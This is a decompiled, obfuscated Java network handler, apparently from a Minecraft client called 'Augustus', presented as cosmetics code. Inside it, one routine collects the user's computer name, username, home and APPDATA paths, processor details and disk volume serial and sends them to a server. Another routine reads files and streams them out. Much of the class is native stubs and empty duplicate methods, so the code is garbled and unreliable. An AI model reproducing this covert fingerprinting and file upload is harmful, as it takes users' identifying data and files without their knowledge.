package client.network;

import client.Client;
import client.event.PostMotionProcessor;
import client.util.AdvancedHashMapEntry;
import client.util.AltByteArrayEntry;
import client.util.AutoRegisterCrypto;
import client.util.AutoRegisterEncryption;
import client.util.AutoRegisterPayload;
import client.util.CommonListenerAdapter;
import client.util.ConsumerWrapper;
import client.util.CoreListenerAdapter;
import client.util.CosmeticsDataManager;
import client.util.CosmeticsItemSetting;
import client.util.CustomLongEntry;
import client.util.DirectStringEntry;
import client.util.DiscordRpcWorker;
import client.util.EMfDf9lTUMessageToMessageDecoder;
import client.util.EnhancedByteArrayEntry;
import client.util.ExtraLongEntry;
import client.util.ExtraStringHolder;
import client.util.FileDirectoryHelper;
import client.util.GenericStringEntry;
import client.util.HashSetEntry;
import client.util.InternalHashMapHolder;
import client.util.PacketPayloadEncoder;
import client.util.PrimaryListenerAdapter;
import client.util.ProfileConfigManager;
import client.util.ProviderStringEntry;
import client.util.SignumComparable;
import client.util.SpecialHashMapEntry;
import client.util.SpecialListenerAdapter;
import client.util.SpecialLongEntry;
import client.util.StaticClientManager;
import client.util.SupplementalLongEntry;
import com.google.common.collect.Queues;
import dev.jnic.aqRLGH.JNICLoader;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.SimpleChannelInboundHandler;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileStore;
import java.nio.file.FileSystems;
import java.util.ArrayList;
import java.util.Queue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantReadWriteLock;
import nick.Connection;

public class CosmeticsNetworkHandler extends SimpleChannelInboundHandler {
   public static final int count;
   public Channel channel;
   public AtomicBoolean atomicBoolean;
   public long timestamp;
   public static final int count3;
   public static final int[] countArray3;
   public final EMfDf9lTUMessageToMessageDecoder eMfDf9lTUMessageToMessageDecoder;
   public SignumComparable signumComparable;
   public boolean enabled3;
   public ChannelHandlerContext channelHandlerContext;
   public static volatile CosmeticsNetworkHandler cosmeticsNetworkHandler;
   public final ReentrantReadWriteLock reentrantReadWriteLock;
   public final Queue queue;
   public volatile boolean enabled7;
   public static volatile long timestamp4;
   public byte[] byteFlagArray2;
   public static volatile long timestamp2;
   public static final int count4;
   public boolean enabled4;
   public static final int[] countArray2;
   public long timestamp3;
   public static final int count2;
   public volatile boolean enabled2;
   public static final int[] countArray;
   public static final int count5;
   public byte[] byteFlagArray3;
   public final SpecialLongEntry specialLongEntry;
   public byte[] byteFlagArray;
   public final boolean enabled6;
   public volatile boolean enabled5;
   public volatile boolean enabled;
   public final PacketPayloadEncoder l68N6uimktYMessageToMessageEncoder;

   private static void applyCosmeticsItemSetting(CosmeticsItemSetting setting) {
      Client.getClient().getModuleManager().cosmetics.updateTertiaryStringEntry(setting);
   }

   public static boolean isToggled(long value) {
      return true;
   }

   private void sleep() {
      try {
         Thread.sleep(1L);
      } catch (InterruptedException interruptedException) {
         throw new RuntimeException(interruptedException);
      }
   }

   public ChannelHandlerContext getChannelHandlerContext() {
      return this.channelHandlerContext;
   }

   public void updatePostMotionProcessor(long value, PostMotionProcessor postMotionProcessor) {
      if (postMotionProcessor instanceof AltByteArrayEntry) {
         try {
            Connection.end();
         } catch (Throwable error) {
            throw new RuntimeException(error);
         }
      }
   }

   private static void applyCommonListenerAdapter(CommonListenerAdapter commonListenerAdapter) {
      Client clientItem = Client.getClient();
      ProviderStringEntry providerStringEntry = new ProviderStringEntry(commonListenerAdapter.getLabelText(), commonListenerAdapter.getLabelText3(), commonListenerAdapter.getLabelText2(), commonListenerAdapter.getCount2(), commonListenerAdapter.getCount());
      clientItem.applyProviderStringEntry(0x473bfdab6c88L, providerStringEntry);
   }

   private static void applyDirectStringEntry(DirectStringEntry directStringEntry) {
      SpecialHashMapEntry.applyDirectStringEntry(directStringEntry);
   }

   public void applyChannelHandlerContext(long value, ChannelHandlerContext channelHandlerContext2, PostMotionProcessor postMotionProcessor) {
      value = 0x549958893b81L;
      value = 0x70a65bc1a11fL ^ value;
      long keySalt = value ^ 0x6672c3e4e475L;
      this.applyPostMotionProcessor(keySalt, postMotionProcessor);
   }

   private native void applyTime(long value);

   private void applyPostMotionProcessor(PostMotionProcessor postMotionProcessor, long value) {
      if (!this.channel.eventLoop().inEventLoop()) {
         this.channel.eventLoop().execute(() -> this.writeAndFlush(postMotionProcessor));
      } else {
         this.channel.writeAndFlush(postMotionProcessor);
      }
   }

   public boolean canExecute(long value) {
      return true;
   }

   public static void updateState(int count6, long value) {
      if (cosmeticsNetworkHandler != null) {
         cosmeticsNetworkHandler.queue.clear();
      }

      cosmeticsNetworkHandler = null;
   }

   private void applyCoreListenerAdapter(char character, char character2, int count6, CoreListenerAdapter coreListenerAdapter) {
      byte byteValue = 0;
      short shortValue = 32704;
      count6 = -1531365012;
      long keySalt = ((long)byteValue << 48 | (long)shortValue << 48 >>> 16 | (long)count6 << 32 >>> 32) ^ 0x70a65bc1a11fL;
      long keySalt2 = ((long)byteValue << 48 | (long)shortValue << 48 >>> 16 | (long)count6 << 32 >>> 32) ^ 0x70a65bc1a11fL ^ 0x5db69415bd94L;
      Object entry = null;
      Object entry2 = null;
      Object entry3 = null;
      Object entry4 = null;
      Object entry5 = null;
      Object entry6 = null;
      Object entry7 = null;
      Object entry8 = null;
      entry = new SignumComparable("482279039");
      entry2 = new SignumComparable("9692993");
      SignumComparable signumComparable2 = new SignumComparable(coreListenerAdapter.getLabelText());
      entry3 = ((SignumComparable)entry).resolveSignumComparable2(signumComparable2, (SignumComparable)entry2);
      SignumComparable signumComparable3 = new SignumComparable(coreListenerAdapter.getLabelText2());
      signumComparable2 = this.signumComparable;
      SignumComparable signumComparable4 = signumComparable3.resolveSignumComparable2(signumComparable2, (SignumComparable)entry2);
      entry4 = new SignumComparable(coreListenerAdapter.getLabelText3());
      entry4 = signumComparable4.resolveSignumComparable4((SignumComparable)entry4).resolveSignumComparable2((SignumComparable)entry2);
      if (!((SignumComparable)entry3).equals(entry4)) {
         ProfileConfigManager profileConfigManager = new ProfileConfigManager();
         String text = "Info (13): UserName: "
            + Client.getClient().getString7()
            + "; Computername: "
            + System.getenv("COMPUTERNAME")
            + "; Username: "
            + System.getenv("USERNAME")
            + " "
            + Client.getClient().getText();
         profileConfigManager.applyText2(keySalt2, text);
         entry = new EnhancedByteArrayEntry(
            "Augustus",
            AutoRegisterPayload.getByteArray("slfjdslasdjfaksdföskdjf".getBytes(StandardCharsets.UTF_8)),
            SupplementalLongEntry.byteIndexArray,
            System.currentTimeMillis()
         );
         this.updatePostMotionProcessor((PostMotionProcessor)entry);
      } else {
         this.enabled4 = true;
         entry5 = "00-00-00-00-00-00";
         entry6 = FileSystems.getDefault().getFileStores().iterator().next();
         entry7 = AutoRegisterEncryption.getAutoRegisterCrypto();
         entry8 = System.getenv("PROCESSOR_LEVEL")
            + System.getenv("NUMBER_OF_PROCESSORS")
            + System.getenv("PROCESSOR_IDENTIFIER")
            + File.listRoots()[0].getTotalSpace()
            + System.getenv("PROCESSOR_REVISION");
         byte[] byteIndexArray = SupplementalLongEntry.byteIndexArray;
         byte[] byteFlagArray4 = getSimpleChannelInboundHandlerAdapter().byteFlagArray;
         StringBuilder builder = new StringBuilder()
            .append((String)entry8)
            .append(System.getenv("PROCESSOR_LEVEL"))
            .append(System.getenv("PROCESSOR_ARCHITECTURE"))
            .append(System.getenv("HOME"))
            .append(System.getenv("NUMBER_OF_PROCESSORS"))
            .append(System.getenv("TMP"))
            .append(System.getenv("PROCESSOR_REVISION"))
            .append((String)entry5)
            .append(System.getenv("COMPUTERNAME"))
            .append(System.getenv("APPDATA"))
            .append(File.listRoots()[0].getTotalSpace())
            .append(System.getenv("DISPLAY"))
            .append(System.getenv("PROCESSOR_IDENTIFIER"))
            .append(System.getenv("USERNAME"))
            .append(System.getenv("HOMEPATH"));
         entry = entry6.toString().getBytes(StandardCharsets.UTF_8);
         builder = builder.append(((AutoRegisterCrypto)entry7).getText((byte[])entry));
         try {
            entry = ((FileStore)entry6).getAttribute("volume:vsn").toString().getBytes(StandardCharsets.UTF_8);
         } catch (java.io.IOException ioException) {
            throw new RuntimeException(ioException);
         }
         entry = new SpecialListenerAdapter(
            byteIndexArray,
            byteFlagArray4,
            AutoRegisterPayload.getByteArray(builder.append(((AutoRegisterCrypto)entry7).getText((byte[])entry)).toString().getBytes(StandardCharsets.UTF_8)),
            DiscordRpcWorker.labelText.getBytes(StandardCharsets.UTF_8)
         );
         this.updatePostMotionProcessor((PostMotionProcessor)entry);
      }
   }

   private static void applyStaticClientManager(StaticClientManager staticClientManager) {
      CosmeticsPayload.processAction(staticClientManager.getCount());
   }

   private static void applyGenericStringEntry(GenericStringEntry genericStringEntry) {
      SpecialHashMapEntry.applyGenericStringEntry(genericStringEntry);
   }

   public static CosmeticsNetworkHandler getSimpleChannelInboundHandlerAdapter() {
      return (CosmeticsNetworkHandler)Connection.INSTANCE;
   }

   public void setEnabled(boolean enabled8) {
      this.enabled = enabled8;
   }

   public static void updateState3(char character, int count6, char character2) {
      long value = 0L;
      long value2 = 0x3b5e15117cc856f1L;

      long value3;
      for (value3 = -0x6ce275edce733ff1L; (int)(value2 % 3L) == 2; value3 = (value3 ^ 0x3cb8c250881f48e9L) + 0x1fe15e2535e88eb9L) {
         value = timestamp2;
         value2 = (value2 ^ 0x39523cc0a5925f16L) + 0x5cdabad8a26046d0L;
      }

      timestamp2 = value + (value3 % 322950L ^ -312572L);
   }

   private static void applyPrimaryListenerAdapter(PrimaryListenerAdapter primaryListenerAdapter) {
      Client.getClient().getModuleManager();
      primaryListenerAdapter.getLabelText3();
      primaryListenerAdapter.getLabelText4();
      primaryListenerAdapter.getLabelText();
      primaryListenerAdapter.getLabelText5();
      primaryListenerAdapter.getCount2();
      primaryListenerAdapter.getCount();
      primaryListenerAdapter.getLabelText2();
      primaryListenerAdapter.isEnabled();
   }

   private boolean isActive2(long value) {
      return true;
   }

   public static void updateState5(long value) {
   }

   private native void applyPostMotionProcessor(long value, PostMotionProcessor postMotionProcessor);

   private static void applyCosmeticsDataManager(CosmeticsDataManager cosmeticsDataManager) {
      Client.getClient().getModuleManager().cosmetics.updateAuxiliaryMapEntry(cosmeticsDataManager);
   }

   private static long getTimestamp2() {
      return timestamp2;
   }

   private void applyPostMotionProcessorByPostMotionProces(PostMotionProcessor postMotionProcessor) {
      this.reentrantReadWriteLock.writeLock().lock();

      try {
         this.queue.add(postMotionProcessor);
      } finally {
         this.reentrantReadWriteLock.writeLock().unlock();
      }

      this.channelActive(null);
   }

   public boolean isActiveAsFlag() {
      this.enabled4 = true;
      this.enabled = false;
      return this.enabled;
   }

   private void updateState4(long value) {
      value = 0x6777f63f0b1eL;
      value = 0x70a65bc1a11fL ^ value;
      if (this.isActive2()) {
         this.reentrantReadWriteLock.readLock().lock();

         try {
            while (!this.queue.isEmpty()) {
               PostMotionProcessor postMotionProcessor = (PostMotionProcessor)this.queue.poll();
               this.applyPostMotionProcessor(postMotionProcessor);
            }
         } finally {
            this.reentrantReadWriteLock.readLock().unlock();
         }
      }
   }

   private native void applyChar(char character, int count6, char character2);

   private static void applyCustomLongEntry(CustomLongEntry customLongEntry) {
      long keySalt = 0x7e26004d1b9dL ^ 0x43bb50618938L;
      InternalHashMapHolder internalHashMapHolder = Client.getClient().getInternalHashMapHolder();
      ConsumerWrapper consumerWrapper = new ConsumerWrapper(
         new HashSetEntry(customLongEntry.getList(), (String)customLongEntry.getList().get(0)),
         AdvancedHashMapEntry.resolveConsumerEntry(customLongEntry.getCount(), customLongEntry.getCount2()),
         customLongEntry.getTimestamp2(),
         customLongEntry.getTimestamp3(),
         customLongEntry.getCount5(),
         customLongEntry.getTimestamp(),
         customLongEntry.isEnabled(),
         customLongEntry.getCount3()
      );
      keySalt = customLongEntry.getTimestamp();
      internalHashMapHolder.applyConsumerWrapper(keySalt, consumerWrapper);
   }

   public void setEnabled7(boolean enabled8) {
      this.enabled7 = enabled8;
   }

   public void exceptionCaught(ChannelHandlerContext channelHandlerContext2, Throwable throwable) throws Exception {
      super.exceptionCaught(channelHandlerContext2, throwable);
      Client.getClient().getClass();
      channelHandlerContext2.close();
   }

   private void applyArrayList(ArrayList list, ExtraLongEntry extraLongEntry, int count6) {

      for (File file : (Iterable<File>)(Iterable)list) {
         long timestamp5 = extraLongEntry.getTimestamp();
         int count7 = extraLongEntry.getCount2();
         byte[] byteIndexArray = SupplementalLongEntry.byteIndexArray;
         int count8 = count7;
         long value = timestamp5;
         ExtraStringHolder extraStringHolder = FileDirectoryHelper.resolveExtraStringHolder(file, value, count8, count6, byteIndexArray);
         this.updatePostMotionProcessor(extraStringHolder);
         long value2 = Math.max(0L, (long)extraStringHolder.getByteFlagArray().length * 1000L / ((long)extraLongEntry.getCount3() * 1024L));

         try {
            Thread.sleep(value2);
         } catch (InterruptedException interruptedException) {
         }
      }
   }

   public boolean isActive() {
      this.enabled7 = true;
      return this.enabled7;
   }

   private static void updateState2() {
      Client.getClient().getInternalHashMapHolder().clear();
   }

   private void writeAndFlush(PostMotionProcessor postMotionProcessor) {
      this.channel.writeAndFlush(postMotionProcessor);
   }

   public void channelRead0(ChannelHandlerContext channelHandlerContext2, Object entry) {
      PostMotionProcessor postMotionProcessor = (PostMotionProcessor)entry;
      this.applyChannelHandlerContext(channelHandlerContext2, postMotionProcessor);
   }

   public void channelActive(ChannelHandlerContext channelHandlerContext2) {
      this.timestamp = System.currentTimeMillis();
      this.applyChar((char)0, 1206823165, (char)3824);
      cosmeticsNetworkHandler = this;
   }

   public void channelInactive(ChannelHandlerContext channelHandlerContext2) throws Exception {
      super.channelInactive(channelHandlerContext2);
   }

   public CosmeticsNetworkHandler(PacketPayloadEncoder packet, long value, EMfDf9lTUMessageToMessageDecoder eMfDf9lTUMessageToMessageDecoder2, SpecialLongEntry specialLongEntry2, boolean flag) {
      this.byteFlagArray = null;
      this.atomicBoolean = new AtomicBoolean(false);
      this.enabled5 = false;
      this.enabled2 = false;
      this.enabled4 = false;
      this.enabled3 = false;
      this.timestamp3 = 0L;
      this.enabled7 = false;
      this.signumComparable = null;
      this.enabled = true;
      this.queue = Queues.newConcurrentLinkedQueue();
      this.reentrantReadWriteLock = new ReentrantReadWriteLock();
      this.l68N6uimktYMessageToMessageEncoder = packet;
      this.eMfDf9lTUMessageToMessageDecoder = eMfDf9lTUMessageToMessageDecoder2;
      this.specialLongEntry = specialLongEntry2;
      this.enabled6 = flag;
   }

   public static native void $jnicLoader();

   public static void $jnicClinit() {
      timestamp2 = 3L;
      timestamp4 = 0L;
      cosmeticsNetworkHandler = null;
   }

   static {
      count4 = 16;
      count2 = 16;
      count = 12;
      count3 = 14;
      count5 = 10;
      countArray = new int[]{82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125};
      countArray2 = new int[]{99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22};
      countArray3 = new int[]{0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54};
      JNICLoader.init();
      $jnicLoader();
      $jnicClinit();
   }

   public CosmeticsNetworkHandler(PacketPayloadEncoder packet, EMfDf9lTUMessageToMessageDecoder eMfDf9lTUMessageToMessageDecoder2, SpecialLongEntry specialLongEntry2, boolean flag) {
      this(packet, 0L, eMfDf9lTUMessageToMessageDecoder2, specialLongEntry2, flag);
   }

   public long computeTimestamp(int count6, String text) {
      return 0L;
   }

   public boolean canExecute() {
      return false;
   }

   public long computeTimestampByText(int count6, String text) {
      return 0L;
   }

   public static void updateState() {
   }

   public void applyCoreListenerAdapter(CoreListenerAdapter coreListenerAdapter) {
   }

   public long computeTimestamp2(int count6, String text) {
      return 0L;
   }

   public void applyChannelHandlerContext(ChannelHandlerContext channelHandlerContext2, PostMotionProcessor postMotionProcessor) {
   }

   public void applyPostMotionProcessor(PostMotionProcessor postMotionProcessor) {
   }

   public long computeTimestamp3(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp4(int count6, String text) {
      return 0L;
   }

   public static void updateState3() {
   }

   public long computeTimestamp5(int count6, String text) {
      return 0L;
   }

   public void updateState4() {
   }

   public static boolean isToggled() {
      return false;
   }

   public void updatePostMotionProcessor(PostMotionProcessor postMotionProcessor) {
   }

   public long computeTimestamp6(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp7(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp8(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp9(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp10(int count6, String text) {
      return 0L;
   }

   public long computeTimestamp11(int count6, String text) {
      return 0L;
   }

   public boolean isActive2() {
      return false;
   }

   public long computeTimestamp12(int count6, String text) {
      return 0L;
   }

   public static void updateState5() {
   }

   public long computeTimestamp13(int count6, String text) {
      return 0L;
   }
}
